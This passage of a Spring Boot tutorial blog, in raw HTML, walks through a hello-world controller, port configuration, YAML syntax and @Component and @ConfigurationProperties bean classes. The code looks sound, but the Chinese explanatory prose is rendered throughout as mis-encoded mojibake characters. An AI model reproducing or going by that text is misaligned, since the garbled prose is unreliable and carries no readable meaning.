class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œçš„Application.javaæ–‡ä»¶å°±æ˜¯æˆ‘ä»¬SpringBootçš„ä¸»ç¨‹åºï¼Œå³ç¨‹åºçš„ä¸»å…¥å£ï¼Œä¹‹åå¯åŠ¨webæœåŠ¡å™¨å°±æ˜¯è¿è¡Œè¿™ä¸ªæ–‡ä»¶</p><p>SpringBootæœ¬è´¨ä¸Šè¿˜æ˜¯ä¸€ä¸ªTomcatç¨‹åºï¼Œå®ƒå†…ç½®äº†tomcatæœåŠ¡å™¨ï¼Œå¹¶ä¸”ç»è¿‡äº†æ”¹åŠ¨ï¼Œå› æ­¤å¯åŠ¨æ¯”Tomcatè¿…é€Ÿè®¸å¤š</p><p>pom.xmlçš„ä¾èµ–ä¸­ï¼Œ<code>org.springframework.boot</code>åŒ…æ‹¬äº†tomcatï¼ŒdispatcherServletï¼Œxml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥å°è¯•è¿è¡Œï¼Œè®¿é—®æœ¬åœ°çš„8080ç«¯å£</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240708174526239.png" alt="image-20240708174526239"></p><p>æ­¤æ—¶æˆ‘ä»¬è¿˜æ²¡æ·»åŠ ä»»ä½•çš„é™æ€èµ„æºå’Œcontrollerï¼Œæ‰€ä»¥è¿”å›404</p><hr><h3 id="åˆ›å»ºä¸€ä¸ªç®€å•çš„controller"><a href="#åˆ›å»ºä¸€ä¸ªç®€å•çš„controller" class="headerlink" title="åˆ›å»ºä¸€ä¸ªç®€å•çš„controller"></a>åˆ›å»ºä¸€ä¸ªç®€å•çš„controller</h3><p>åœ¨ Application.java çš„åŒçº§ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªcontroller packageï¼Œç„¶ååœ¨é‡Œé¢å†™ä¸€ä¸ªHelloController.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@RestController</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// è°ƒç”¨ä¸šåŠ¡ï¼Œæ¥æ”¶å‰ç«¯å‚æ•°</span>        <span class="token keyword">return</span> <span class="token string">"hello,world"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·å°±åˆ›å»ºäº†ä¸€ä¸ªæ¥å£ï¼š<a href="http://localhost:8080/hello">http://localhost:8080/hello</a></p><p><img src="/blog/2024/06/28/SpringBoot/image-20240708181144025.png" alt="image-20240708181144025"></p><p>æˆåŠŸè®¿é—®</p><hr><h3 id="é…ç½®ç«¯å£"><a href="#é…ç½®ç«¯å£" class="headerlink" title="é…ç½®ç«¯å£"></a>é…ç½®ç«¯å£</h3><p>åœ¨application.propertiesé‡Œæ·»åŠ <code>server.port</code>å³å¯æŒ‡å®šç«¯å£</p><hr><h3 id="SpringBootè‡ªåŠ¨è£…é…åŸç†"><a href="#SpringBootè‡ªåŠ¨è£…é…åŸç†" class="headerlink" title="SpringBootè‡ªåŠ¨è£…é…åŸç†"></a>SpringBootè‡ªåŠ¨è£…é…åŸç†</h3><p>æ²¡æ€ä¹ˆå­¦Springï¼Œä¸€æ—¶åŠä¼šè¿˜æ„Ÿå—ä¸åˆ°SpringBootçš„æ ¸å¿ƒé­…åŠ›</p><p>å…ˆæ”¾ä¸ªå‚è€ƒæ–‡ç« åœ¨è¿™ï¼š<a href="https://www.cnblogs.com/javaguide/p/springboot-auto-config.html">https://www.cnblogs.com/javaguide/p/springboot-auto-config.html</a></p><hr><h2 id="Yamlè¯­æ³•"><a href="#Yamlè¯­æ³•" class="headerlink" title="Yamlè¯­æ³•"></a>Yamlè¯­æ³•</h2><p>ç¼–Docker-composeï¼Œé…ç½®hexoåšå®¢æ—¶å·²ç»éå¸¸ç†Ÿæ‚‰äº†ï¼Œè¿™è¾¹ç²—ç•¥å†™ç‚¹åŸºæœ¬çš„è¯­æ³•</p><h3 id="è¯­æ³•ç‰¹ç‚¹"><a href="#è¯­æ³•ç‰¹ç‚¹" class="headerlink" title="è¯­æ³•ç‰¹ç‚¹"></a>è¯­æ³•ç‰¹ç‚¹</h3><ul><li>å¤§å°å†™æ•æ„Ÿ</li><li>å’Œpythonç±»ä¼¼ï¼Œä½¿ç”¨ç¼©è¿›è¡¨ç¤ºå±‚çº§å…³ç³»</li><li>ç¼©è¿›ä¸å…è®¸ä½¿ç”¨tabï¼Œåªå…è®¸ç©ºæ ¼</li><li>ç¼©è¿›çš„ç©ºæ ¼æ•°ä¸é‡è¦ï¼Œåªè¦åŒçº§å…ƒç´ å·¦å¯¹é½å³å¯</li><li><code>#</code>è¡¨ç¤ºæ³¨é‡Š</li></ul><h3 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h3><ul><li>å¯¹è±¡ï¼šé”®å€¼å¯¹çš„é›†åˆï¼Œåˆç§°ä¸ºæ˜ å°„ï¼Œå“ˆå¸Œï¼Œå­—å…¸</li><li>æ•°ç»„ï¼šä¸€ç»„æŒ‰æ¬¡åºæ’åˆ—çš„å…ƒç´ </li><li>çº¯é‡ï¼šå®é™…ä¸Šå°±æ˜¯æ™®é€šçš„å•ä¸€å˜é‡</li></ul><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment">#å¯¹è±¡çš„ç”¨æ³•</span><span class="token key atrule">Person</span><span class="token punctuation">:</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> Azusa  <span class="token key atrule">age</span><span class="token punctuation">:</span> <span class="token number">16</span>  <span class="token comment">#å­å¯¹è±¡</span>  <span class="token key atrule">Dog</span><span class="token punctuation">:</span>      <span class="token key atrule">name</span><span class="token punctuation">:</span> Gino      <span class="token key atrule">age</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token comment">#æ•°ç»„ç”¨æ³•,ä¸‹é¢ä¾‹å­è¡¨ç¤ºHuman:["YourName","YourAge","Nothing"]</span><span class="token key atrule">Human</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> YourName    <span class="token punctuation">-</span> YourAge    <span class="token punctuation">-</span> Nothing<span class="token comment">#æˆ–è€…</span><span class="token key atrule">Human2</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">]</span><span class="token comment">#å­—æˆå‘˜ç”¨æ³• A:[1,2,[1,2,3]]</span><span class="token key atrule">A</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token number">1</span>  <span class="token punctuation">-</span> <span class="token number">2</span>  <span class="token punctuation">-</span>    <span class="token punctuation">-</span> <span class="token number">1</span>    <span class="token punctuation">-</span> <span class="token number">2</span>    <span class="token punctuation">-</span> <span class="token number">3</span><span class="token comment">#è¿˜æœ‰å¤æ‚ä¸€ç‚¹çš„ç”¨æ³•ï¼Œcompanies: [&#123;id: 1,name: company1,price: 200W&#125;,&#123;id: 2,name: company2,price: 500W&#125;]</span><span class="token key atrule">companies</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span>    <span class="token key atrule">id</span><span class="token punctuation">:</span> <span class="token number">1</span>    <span class="token key atrule">name</span><span class="token punctuation">:</span> company1    <span class="token key atrule">price</span><span class="token punctuation">:</span> 200w  <span class="token punctuation">-</span>    <span class="token key atrule">id</span><span class="token punctuation">:</span> <span class="token number">2</span>    <span class="token key atrule">name</span><span class="token punctuation">:</span> company2    <span class="token key atrule">price</span><span class="token punctuation">:</span> 300w<span class="token comment">#å¤åˆç»“æ„</span><span class="token key atrule">languages</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> ruby  <span class="token punctuation">-</span> perl  <span class="token punctuation">-</span> python<span class="token key atrule">websites</span><span class="token punctuation">:</span>  <span class="token key atrule">Yaml</span><span class="token punctuation">:</span> yaml.org  <span class="token key atrule">ruby</span><span class="token punctuation">:</span> ruby.org  <span class="token key atrule">python</span><span class="token punctuation">:</span> python.org<span class="token comment">#çº¯é‡åŒ…æ‹¬ï¼šå­—ç¬¦ä¸²ï¼Œå¸ƒå°”å€¼ï¼Œæ•´æ•°ï¼Œæµ®ç‚¹æ•°ï¼ŒNullï¼Œæ—¶é—´ï¼Œæ—¥æœŸ</span><span class="token key atrule">boolean</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token boolean important">TRUE</span> <span class="token comment">#æˆ–è€…trueï¼Œè¿™é‡Œçš„trueå°±æ˜¯çº¯é‡</span>  <span class="token punctuation">-</span> <span class="token boolean important">FALSE</span><span class="token key atrule">float</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token number">3.14</span> <span class="token comment">#3.14ä¹Ÿæ˜¯çº¯é‡ï¼Œçº¯é‡çš„æ„æ€å°±æ˜¯ä¸€äº›å¸¸é‡</span>  <span class="token punctuation">-</span> <span class="token number">1.1415</span><span class="token key atrule">int</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token number">1</span>  <span class="token punctuation">-</span> <span class="token number">2</span><span class="token key atrule">null</span><span class="token punctuation">:</span>  <span class="token key atrule">nodename</span><span class="token punctuation">:</span> <span class="token string">'node'</span>  <span class="token key atrule">parent</span><span class="token punctuation">:</span> <span class="token null important">~</span> <span class="token comment">#ä½¿ç”¨~è¡¨ç¤ºnull</span><span class="token key atrule">string</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> å“ˆå“ˆ  <span class="token punctuation">-</span> hello  <span class="token punctuation">-</span> <span class="token string">"hello"</span> <span class="token comment">#åŠ ä¸åŠ å¼•å·éƒ½æ— æ‰€è°“</span><span class="token key atrule">data</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token datetime number">2022-12-12</span> <span class="token comment">#æ—¥æœŸå¿…é¡»ä»¥yyyy-MM-ddçš„æ ¼å¼</span><span class="token key atrule">datatime</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token datetime number">2022-12-12T15:02:31+08:00</span> <span class="token comment">#æ—¶é—´ä½¿ç”¨ISO 8601æ ¼å¼ï¼Œæ—¶é—´å’Œæ—¥æœŸä¹‹é—´ä½¿ç”¨Tè¿æ¥ï¼Œæœ€åä½¿ç”¨+ä»£è¡¨æ—¶åŒº</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="ç»™å±æ€§èµ‹å€¼çš„å‡ ç§æ–¹å¼"><a href="#ç»™å±æ€§èµ‹å€¼çš„å‡ ç§æ–¹å¼" class="headerlink" title="ç»™å±æ€§èµ‹å€¼çš„å‡ ç§æ–¹å¼"></a>ç»™å±æ€§èµ‹å€¼çš„å‡ ç§æ–¹å¼</h2><h3 id="ä¼ ç»Ÿæ´¾ï¼šValueèµ‹å€¼"><a href="#ä¼ ç»Ÿæ´¾ï¼šValueèµ‹å€¼" class="headerlink" title="ä¼ ç»Ÿæ´¾ï¼šValueèµ‹å€¼"></a>ä¼ ç»Ÿæ´¾ï¼šValueèµ‹å€¼</h3><p>ä½¿ç”¨<code>@Componet</code>æ³¨è§£<strong>è¡¨æ˜è¿™ä¸ªç±»æ˜¯ä¸€ä¸ªbean</strong>ï¼Œä¸ç”¨åƒSpringMVCé‚£æ ·å»xmlå†™<code>&lt;bean id=&quot;&quot; class=&quot;&quot;&gt;</code></p><blockquote><p>JavaBeanæ˜¯ä¸€ç§Javaç±»ï¼Œè€Œä¸”æ˜¯ä¸€ç§ç‰¹æ®Šçš„ã€å¯é‡ç”¨çš„ç±»ï¼šå¿…é¡»å…·æœ‰æ— å‚æ•°çš„æ„é€ å™¨ï¼Œæ‰€æœ‰çš„å±æ€§éƒ½æ˜¯privateçš„ï¼Œé€šè¿‡æä¾›setterå’Œgetteræ–¹æ³•æ¥å®ç°å¯¹æˆå‘˜å±æ€§çš„è®¿é—®ï¼Œéœ€è¦è¢«åºåˆ—åŒ–å¹¶ä¸”å®ç°äº† Serializable æ¥å£ï¼Œbeançš„ç¤ºä¾‹å¦‚ä¸‹ï¼š</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StudentsBean</span> <span class="token keyword">implements</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>Serializable</span><span class="token punctuation">&#123;</span>   <span class="token keyword">private</span> <span class="token class-name">String</span> firstName <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>   <span class="token keyword">private</span> <span class="token class-name">String</span> lastName <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>   <span class="token keyword">private</span> <span class="token keyword">int</span> age <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token class-name">StudentsBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getFirstName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> firstName<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getLastName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> lastName<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> age<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setFirstName</span><span class="token punctuation">(</span><span class="token class-name">String</span> firstName<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>firstName <span class="token operator">=</span> firstName<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setLastName</span><span class="token punctuation">(</span><span class="token class-name">String</span> lastName<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>lastName <span class="token operator">=</span> lastName<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨SpringBootä¸­åªéœ€è¦ç”¨æ³¨è§£<code>@Component</code>ï¼Œç„¶åå°±èƒ½å¼€å§‹å†™beanç±»äº†</p><blockquote><p>tipsï¼šIDEAä¸­ï¼Œalt+insertå¯ä»¥å¿«é€Ÿç”Ÿæˆæ„é€ å‡½æ•°ï¼Œgetterï¼Œsetterç­‰æ–¹æ³•</p></blockquote><p>å†™ä¸€ä¸ªCatç±»ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>pojo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Value</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Cat</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Integer</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"Cat&#123;"</span> <span class="token operator">+</span>                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span>                <span class="token char">'&#125;'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†å†™ä¸€ä¸ªPersonç±»ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>pojo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>context<span class="token punctuation">.</span>properties<span class="token punctuation">.</span></span><span class="token class-name">ConfigurationProperties</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Date</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@ConfigurationProperties</span><span class="token punctuation">(</span>prefix <span class="token operator">=</span> <span class="token string">"person"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> age<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Boolean</span> happy<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Date</span> birth<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> maps<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> lists<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Cat</span> cat<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Integer</span> age<span class="token punctuation">,</span> <span class="token class-name">Boolean</span> happy<span class="token punctuation">,</span> <span class="token class-name">Date</span> birth<span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> maps<span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> lists<span class="token punctuation">,</span> <span class="token class-name">Cat</span> cat<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>happy <span class="token operator">=</span> happy<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>birth <span class="token operator">=</span> birth<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>maps <span class="token operator">=</span> maps<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>lists <span class="token operator">=</span> lists<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>cat <span class="token operator">=</span> cat<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Boolean</span> <span class="token function">getHappy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> happy<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setHappy</span><span class="token punctuation">(</span><span class="token class-name">Boolean</span> happy<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>happy <span class="token operator">=</span> happy<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Date</span> <span class="token function">getBirth</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> birth<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setBirth</span><span class="token punctuation">(</span><span class="token class-name">Date</span> birth<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>birth <span class="token operator">=</span> birth<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> <span class="token function">getMaps</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> maps<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setMaps</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> 